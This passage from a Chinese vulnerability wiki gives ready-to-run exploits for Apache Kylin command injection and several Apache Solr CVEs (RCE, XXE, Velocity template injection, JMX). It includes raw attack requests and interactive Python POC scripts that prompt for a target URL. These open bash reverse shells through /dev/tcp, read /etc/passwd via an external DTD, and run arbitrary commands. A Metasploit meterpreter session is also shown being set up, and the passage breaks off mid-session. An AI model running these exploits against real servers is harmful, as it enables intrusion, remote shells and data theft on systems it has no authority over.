(InterruptedException e) { Thread.currentThread().interrupt(); throw new IOException(e); } } } 这样我们就可以通过控制 {project} 请求就可以造成命令注入 /kylin/api/diag/project/{project}/download /kylin/api/diag/project/||ping `whoami.111.111.111`||/download 拼接后则出现 /home/admin/apache-kylin-3.0.1-bin-hbase1x/bin/diag.sh {project} {diagDir} 这里通过报错语句可以回显命令验证漏洞存在 throw new InternalErrorException(\"Failed to dump project diagnosis info. \" + e.getMessage(), e); 在修复中，过滤了||,&&等符号，造成无法命令注入 漏洞通报中共两个利用点 /kylin/api/diag/project/{project}/download /kylin/api/diag/job/{jobId}/download 查看函数发现利用方式相同，直接利用job会失败，因为 {project}默认有一个learn_kylin，而job没有 漏洞利用POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import base64 import sys import re def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Apache Kylin >> http://xxx.xxx.xxx.xxx:7070 \\033[0m') print('+ \\033[36mLogin >>> admin:KYLIN(格式为User:Pass) \\033[0m') print('+------------------------------------------') def POC_1(target_url): login_url = target_url + \"/kylin/api/user/authentication\" user_pass = str(input(\"\\033[35mPlease input User and Pass\\nLogin >>> \\033[0m\")) Authorization = \"Basic \" + str((base64.b64encode(user_pass.encode('utf-8'))),'utf-8') headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Authorization\": Authorization, \"Cookie\": \"project=null\" } try: response = requests.post(url=login_url, headers=headers, timeout=20) if \"password\" not in response.text: print(\"\\033[31m[x] 账号密码出现错误 \\033[0m\") sys.exit(0) else: print(\"\\033[32m[o] 成功登录，获得JSESSIONID：\" + response.cookies[\"JSESSIONID\"] + \"\\033[0m\") return response.cookies[\"JSESSIONID\"] except: print(\"\\033[31m[x] 漏洞利用失败\\033[0m\") sys.exit(0) def POC_2(target_url, cookie): vuln_url = target_url + '/kylin/api/diag/project/%7C%7Cping%20%60whoami%60.111.111.111%7C%7C/download' headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": \"project=null;JSESSIONID=\" + cookie } try: response = requests.get(url=vuln_url, headers=headers, timeout=20) if \".111.111.111||\" in response.text: whoami = re.findall(r'ping: (.*?).111.111.111: 未知的名称或服务',response.text)[0] print(\"\\033[32m[o] 存在漏洞，成功执行whoami，响应为{}\\033[0m\".format(whoami)) else: print(\"\\033[31m[x] 漏洞利用失败,||,&&等符号已被过滤，无法造成命令注入\\033[0m\") except: print(\"\\033[31m[x] 请求超时\\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) try: cookie = POC_1(target_url) except: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") sys.exit(0) POC_2(target_url, cookie) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Solr/":{"url":"book/Web服务器漏洞/Apache/Apache Solr/","title":"Apache Solr","keywords":"","body":"Apache Solr Apache Solr RCE 远程执行漏洞 CVE-2019-0193 Apache Solr Velocity模板远程执行 CVE-2019-17558 Apache Solr 远程命令执行漏洞 CVE-2017-12629 Apache Solr XXE 漏洞 CVE-2017-12629 Apache Solr JMX服务 RCE CVE-2019-12409 Apache Solr RCE 未授权上传漏洞 CVE-2020-13957 Apache Solr 任意文件读取漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Solr/Apache Solr RCE 远程命令执行漏洞 CVE-2017-12629.html":{"url":"book/Web服务器漏洞/Apache/Apache Solr/Apache Solr RCE 远程命令执行漏洞 CVE-2017-12629.html","title":"Apache Solr RCE 远程执行漏洞 CVE-2017-12629","keywords":"","body":"Apache Solr RCE 远程执行漏洞 CVE-2017-12629 漏洞描述 Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现。此次7.1.0之前版本总共爆出两个漏洞：XML实体扩展漏洞（XXE）和远程命令执行漏洞（RCE），二者可以连接成利用链，编号均为CVE-2017-12629。 影响版本 [!NOTE] Apache Solr 环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2017-12629 docker-compose build docker-compose up -d 漏洞复现 远程命令执行 先请求url地址获取 core 内容 http://xxx.xxx.xxx.xxx:8983/solr/admin/cores [!NOTE] 通过查看代码，能够触发命令执行的事件有两个：postCommit 和 newSearcher 使用 postCommit 第一个请求包用于载入缓存中 [!NOTE] exe : ping 执行的命令 dir: 命令存在的目录位置 args:命令参数 如下请求包执行的是 /bin/ping 1.1.1.1 POST /solr/demo/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Connection: close Content-Type: application/json Content-Length: 198 { \"add-listener\" : { \"event\":\"postCommit\", \"name\":\"newlistener-1\", \"class\":\"solr.RunExecutableListener\", \"exe\":\"ping\", \"dir\":\"/bin/\", \"args\":[\"1.1.1.1\"] } } 第二个请求包用于更新缓存并执行命令 POST /solr/demo/update HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Connection: close Content-Type: application/json Content-Length: 198 [{\"id\":\"test\"}] [!NOTE] 注意 第一个请求包的这个位置 \"name\":\"newlistener-1\", listerer的名字需要替换，例如第一次 为 newlistener-1 ，第二次则需要改为 newlistener-2 注意 第二个请求包的这个位置 [{\"id\":\"test\"}]， 同第一个请求包的name，每执行一次就需要更换 id ,例如第一次 为 test ，第二次则需要改为 tset-2 注意 Content-Type: application/json 需要添加 不更改执行发生报错示例 进入docker容器查看发现命令已经执行 使用 newSearcher 使用 newSearcher可以直接加载入缓存执行命令 请求包如下 POST /solr/demo/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Connection: close Content-Type: application/json Content-Length: 198 { \"add-listener\" : { \"event\":\"newSearcher\", \"name\":\"newlistener-2\", \"class\":\"solr.RunExecutableListener\", \"exe\":\"bash\", \"dir\":\"/bin/\", \"args\":[ \"-c\", \"mkdir /tmp/vuln\", ] } } [!NOTE] 注意点同上，也需要每次执行更改 \"name\":\"newlistener-2\" 的参数 成功执行了创建文件的命令 关于 如果想要执行其他命令,则需要命令的的位置，例如执行ping，则需要设置dir参数为 /usr/bin/ping 或者 /bin/ping，如果需要检测漏洞是否存在则可以使用 dnslog来检测 漏洞利用POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json import random def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Apache Solr >> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mcmd >>> dnslog地址(漏洞外连检测) \\033[0m') print('+ \\033[36mCmd >>> shell(反弹shell) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] 成功获得core_name,Url为：\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) def POC_2(target_url, core_name, dnslog_url, n): exp_url = target_url + \"/solr/\" + core_name + \"/config\" dnslog_url = \"`whoami`.\" + dnslog_url headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } payload_cmd = \"\"\" {\"add-listener\":{\"event\":\"postCommit\",\"name\":\"newSearche-%s\",\"class\":\"solr.RunExecutableListener\",\"exe\":\"curl\",\"dir\":\"/usr/bin/\",\"args\":[\"%s\"]}} \"\"\" % (n, dnslog_url) response = requests.request(\"POST\", url=exp_url, headers=headers, data=payload_cmd, timeout=30) if \"add-listener\" in response.text: print(\"\\033[32m[o] 成功执行，请查看dnslog \\033[0m\") else: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") def POC_3(target_url, core_name, n, ip, port): exp_url = target_url + \"/solr/\" + core_name + \"/config\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } payload_cmd = \"\"\" {\"add-listener\":{\"event\":\"postCommit\",\"name\":\"newSearche-%s\",\"class\":\"solr.RunExecutableListener\",\"exe\":\"sh\",\"dir\":\"/bin/\",\"args\":[\"-c\",\"bash -i >& /dev/tcp/%s/%s 0>&1\"]}} \"\"\" % (n, ip, port) response = requests.request(\"POST\", url=exp_url, headers=headers, data=payload_cmd, timeout=30) if \"add-listener\" in response.text: print(\"\\033[32m[o] 成功执行 \\033[0m\") else: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) while True: n = random.randint(1, 9999) cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) elif cmd == \"shell\": IP = str(input(\"\\033[35m请输入监听IP >>> \\033[0m\")) PORT = str(input(\"\\033[35m请输入监听PORT >>> \\033[0m\")) POC_3(target_url, core_name, n, IP, PORT) elif cmd == \"dnslog\": dnslog_url = str(input('\\033[35m请输入你的dnslog地址：\\033[0m')) POC_2(target_url, core_name, dnslog_url, n) [!NOTE] 如果shell或dnslog无反应，可以选择更改一下POC的部分参数执行需要的代码 参考文章 Apache Solr远程代码执行漏洞（CVE-2017-12629）从利用到入侵检测 cve-2017-12629 apache solr xxe & rce 漏洞分析 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Solr/Apache Solr XXE 漏洞 CVE-2017-12629.html":{"url":"book/Web服务器漏洞/Apache/Apache Solr/Apache Solr XXE 漏洞 CVE-2017-12629.html","title":"Apache Solr XXE 漏洞 CVE-2017-12629","keywords":"","body":"Apache Solr XXE 漏洞 CVE-2017-12629 漏洞描述 Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现。此次7.1.0之前版本总共爆出两个漏洞：XML实体扩展漏洞（XXE）和远程命令执行漏洞（RCE）。 影响版本 Apache Solr 环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2017-12629-XXE docker-compose build docker-compose up -d 漏洞复现 Dnslog 先请求url地址获取 core 内容 http://xxx.xxx.xxx.xxx:8983/solr/admin/cores 访问 http://xxx.xxx.xxx.xxx:8983/solr/demo/select?q={!xmlparser v=''}&wt=xml 查看dnslog得到请求 远程读取文件 在自己的服务器上写入一个可访问的XML文件，内容写入 \"> 然后请求这个文件来读取服务器上的文件 http://xxx.xxx.xxx.xxx:8983/solr/demo/select?&q=%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2fpeiqi.tech%2f1.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E&wt=xml&defType=xmlparser [!NOTE] 注意这里的payload进行了url编码,请求的文件为 http://peiqi.tech/1.dtd，有更多需求自行更改写入的xml文件 漏洞利用POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json import random def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Apache Solr >> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mcmd >>> dnslog地址(漏洞外连检测) \\033[0m') print('+ \\033[36mCmd >>> xxe_file(读取/etc/passwd) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] 成功获得core_name,Url为：\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) def POC_2(target_url, core_name, dnslog_url): dns_payload = \"\"\" /solr/%s/select?q={!xmlparser v=''}&wt=xml \"\"\" % (core_name, dnslog_url) vuln_url = target_url + dnslog_url headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: response = requests.request(\"GET\", url=vuln_url, headers=headers, timeout=30) if \"HTTP ERROR 500\" in response.text: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") else: print(\"\\033[32m[o] 请查看dnslog响应 \\033[0m\") except: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") def POC_3(target_url, core_name): file_payload = \"\"\"/solr/{}/select?&q=%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2fpeiqi.tech%2f1.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E&wt=xml&defType=xmlparser\"\"\".format(core_name) vuln_url = target_url + file_payload headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vuln_url, headers=headers, timeout=30) if \"/usr/sbin\" in response.text: print(\"\\033[32m[o] 漏洞成功利用,响应为\\n \\033[0m\",response.text) else: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) while True: n = random.randint(1, 9999) cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) elif cmd == \"dnslog\": dnslog_url = str(input('\\033[35m请输入你的dnslog地址：\\033[0m')) POC_2(target_url, core_name, dnslog_url, n) elif cmd == \"xxe_file\": POC_3(target_url, core_name) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Solr/Apache Solr 远程执行漏洞 CVE-2019-0193.html":{"url":"book/Web服务器漏洞/Apache/Apache Solr/Apache Solr 远程执行漏洞 CVE-2019-0193.html","title":"Apache Solr 远程执行漏洞 CVE-2019-0193","keywords":"","body":"Apache Solr 远程执行漏洞 CVE-2019-0193 漏洞描述 2019 年 08 月 01 日，Apache Solr 官方发布预警，Apache Solr DataImport 功能 在开启 Debug 模式时，可以接收来自请求的”dataConfig”参数，这个参数的功能与data-config.xml 一样，不过是在开启 Debug 模式时方便通过此参数进行调试，并且 Debug 模式的开启是通过参数传入的。在 dataConfig 参数中可以包含 script 恶意脚本导致远程代码执行。 影响版本 [!NOTE] Apache Solr 环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2019-0193 docker-compose build docker-compose up -d # 创建一个solr核心test docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db 访问 http://xxx.xxx.xxx.xxx:8983/solr/ 正常即可 漏洞复现 点击刚刚创建的test进入调试 将下面的POC代码填入 Debug-Mode 中 注意 POC 执行的代码中的base64字符串的位置请置换成自己的ip地址并base64加密填入 [!NOTE] bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1 直接如上写入反弹无反应，不稳定，需要base64加密写才能反弹一个shell 点击EXecute执行代码 成功反弹shell 漏洞利用POC [!NOTE] POC不支持反弹shell，如需反弹shell，请按如上步骤反弹shell #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Apache Solr >> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mCmd >>> whoami(命令执行) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] 成功获得core_name,Url为：\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) def POC_2(target_url, core_name): mode_url = target_url + \"/solr/\" + core_name + \"/admin/mbeans?cat=QUERY&wt=json\" response = requests.request(\"GET\", url=mode_url, timeout=20) mode = dict(dict(list(json.loads(response.text)[\"solr-mbeans\"])[1])['/dataimport'])['class'] if \"org.apache.solr.handler.dataimport.DataImportHandler\" in mode: print(\"\\033[32m[o] 目标Url,Dataimport模块开启\\033[0m\") else: print(\"\\033[31m[x] 目标Url,Dataimport模块未开启\\033[0m\") sys.exit(0) def POC_3(target_url, core_name, cmd): vuln_url = target_url + \"/solr/\" + core_name + \"/dataimport\" headers = { 'Host': target_url, 'User-Agent': \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", 'Accept': \"application/json, text/plain, */*\", 'Accept-Language': \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", 'Accept-Encoding': \"zip, deflate\", 'Referer': \"\" + target_url + \"/solr/\", 'Content-type': \"application/x-www-form-urlencoded\", 'X-Requested-With': \"XMLHttpRequest\", 'Content-Length': \"1007\", 'Connection': \"close\" } payload = \"\"\" command=full-import&verbose=false&clean=false&commit=false&debug=true&core=test&name=dataimport&dataConfig= \"\"\" % cmd response = requests.request(\"POST\", url=vuln_url, data=payload, headers=headers, timeout=30) try: get_message = list(json.loads(response.text)[\"documents\"])[0] message = dict(get_message)['title'][0] print(\"\\033[32m[o] 漏洞成功利用,响应为\\n \\033[0m\", message) except: print(\"\\033[31m[x] 代码执行失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) POC_2(target_url, core_name) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) else: POC_3(target_url, core_name, cmd) 参考文章 apache solr远程代码执行漏洞(cve-2019-0193) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Solr/Apache Solr Velocity模板远程执行 CVE-2019-17558.html":{"url":"book/Web服务器漏洞/Apache/Apache Solr/Apache Solr Velocity模板远程执行 CVE-2019-17558.html","title":"Apache Solr Velocity模板远程执行 CVE-2019-17558","keywords":"","body":"Apache Solr Velocity模板远程执行 CVE-2019-17558 漏洞描述 2019年10月末，GitHub代码中安全研究员S00pY发布一个Apache Solr Velocity模版注入远程命令执行的POC，发现网络上出现针对Apache Solr服务器的远程代码执行漏洞。该漏洞是由于Velocity模板存在注入所致（Velocity是一个基于Java的模板引擎，可让使用者通过模板语言引用Java中定义的对象）。攻击者在知道Solr服务器上Core名称后，先把params.resource.loader.enabled设置为true（就可加载指定资源），再进行远程执行命令。 影响版本 [!NOTE] Apache Solr 5.x 至 8.2.0 环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2019-17558 docker-compose build docker-compose up -d # 创建一个solr核心test docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db 访问 http://xxx.xxx.xxx.xxx:8983/solr/ 正常即可 漏洞复现 打开后获取 Core 信息 得知 test 这个 Core 存在 访问 http://xxx.xxx.xxx.xxx:8983/solr/test/config 正常 访问Core的config配置信息时，通过POST请求把params.resource.loader.enabled设置为 True，再通过精心构造的get请求即可RCE，此时用户就可以加载指定资源，构造一个能执行命令的恶意请求 设置params.resource.loader.enabled为True POST /solr/test/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close Content-Length: 259 { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } 命令执行 再使用POC造成命令执行 http://xxx.xxx.xxx.xxx:8983/solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=\"\")+%23set($rt=$x.class.forName(\"java.lang.Runtime\"))+%23set($chr=$x.class.forName('java.lang.Character'))+%23set($str=$x.class.forName(\"java.lang.String\"))+%23set($ex=$rt.getRuntime().exec(\"whoami\"))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end 反弹hell，因为部分命令会被过滤导致返回 Error 500 ，所以反弹shell需要用另外的反弹shell方法 POC : /bin/bash -c $@|bash 0 echo bash -i >& /dev/tcp/xxx.xxx.xxx.xxx:9999 0>&1 POC需要Urlencoding进行编码才能绕过 POC ： %2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F{IP}%2F{PORT}%200%3E%261 漏洞利用POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Apache Solr 5.0.0 - 8.3.1 \\033[0m') print('+ \\033[36m使用格式: python3 cve-2019-17558.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mCmd >>> whoami(命令执行) \\033[0m') print('+ \\033[36mCmd >>> shell(反弹shell) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] 成功获得core_name,Url为：\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) def POC_2(target_url, core_name): open_params = target_url + \"/solr/\" + core_name + \"/config\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } set_api_data = \"\"\" { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } \"\"\" response = requests.request(\"POST\", url=open_params, data=set_api_data, headers=headers, timeout=10) if response.status_code == 200: print(\"\\033[32m[o] POST请求成功将params.resource.loader.enabled设置为True \\033[0m\") else: print(\"\\033[31m[x] POST请求params.resource.loader.enabled设置为True失败 \\033[0m\") sys.exit(0) def POC_3(target_url, core_name, cmd): vnul_url = target_url + \"/solr/\" + core_name + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vnul_url, headers=headers, timeout=10) if \"Error 500\" in response.text: print(\"\\033[31m[x] 代码执行失败，响应为 Error 500 \\033[0m\") else: print(\"\\033[32m[o] 漏洞成功利用,响应为\\n \\033[0m\",response.text) def POC_4(target_url, core_name, IP, POST): # POC : /bin/bash -c $@|bash 0 echo bash -i >& /dev/tcp/xxx.xxx.xxx.xxx:9999 0>&1 cmd = \"%2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261\".format(IP, POST) vnul_url = target_url + \"/solr/\" + core_name + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vnul_url, headers=headers) if __name__ == \"__main__\": title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) POC_2(target_url, core_name) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) elif cmd == \"shell\": IP = str(input(\"\\033[35m请输入监听IP >>> \\033[0m\")) PORT = str(input(\"\\033[35m请输入监听PORT >>> \\033[0m\")) POC_4(target_url, core_name, IP, PORT) else: POC_3(target_url, core_name, cmd) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Solr/Apache Solr JMX服务 RCE CVE-2019-12409.html":{"url":"book/Web服务器漏洞/Apache/Apache Solr/Apache Solr JMX服务 RCE CVE-2019-12409.html","title":"Apache Solr JMX服务 RCE  CVE-2019-12409","keywords":"","body":"Apache Solr JMX服务 RCE CVE-2019-12409 漏洞描述 Java ManagementExtensions（JMX）是一种Java技术，为管理和监视应用程序、系统对象、设备（如打印机）和面向服务的网络提供相应的工具。JMX 作为 Java的一种Bean管理机制，如果JMX服务端口暴露，那么远程攻击者可以让该服务器远程加载恶意的Bean文件，随着Bean的滥用导致远程代码执行。 影响版本 [!NOTE] Apache Solr 8.1.1 Apache Solr 8.2.0 环境搭建 下载 Apache Solr 8.2.0 也可以docker搭建 docker pull solr:8.2.0 docker run --name solr -d -p 8983:8983 -t solr:8.2.0 访问 http://xxx.xxx.xxx.xxx:8983/solr/ 正常即可 漏洞复现 查看搭建的Solr是否存在漏洞,查看solr.in.sh配置文件中的ENABLE_REMOTE_JMX_OPTS选项设置是否为“Ture”，如果为Ture，则存在漏洞 查看漏洞端口18983是否开放 [!NOTE] nmap xxx.xxx.xxx.xxx -p 18983 root@kali:~/桌面# msfconsole , , / \\ ((__---,,,---__)) (_) O O (_)_________ \\ _ / |\\ o_o \\ M S F | \\ \\ _____ | * ||| WW||| ||| ||| =[ metasploit v5.0.101-dev ] + -- --=[ 2049 exploits - 1108 auxiliary - 344 post ] + -- --=[ 562 payloads - 45 encoders - 10 nops ] + -- --=[ 7 evasion ] Metasploit tip: Writing a custom module? After editing your module, why not try the reload command msf5 > use exploit/multi/misc/java_jmx_server [*] No payload configured, defaulting to java/meterpreter/reverse_tcp msf5 exploit(multi/misc/java_jmx_server) > set rhost 192.168.51.146 rhost => 192.168.51.146 msf5 exploit(multi/misc/java_jmx_server) > set rport 18983 rport => 18983 msf5 exploit(multi/misc/java_jmx_server) > set payload java/meterpreter/reverse_tcp payload => 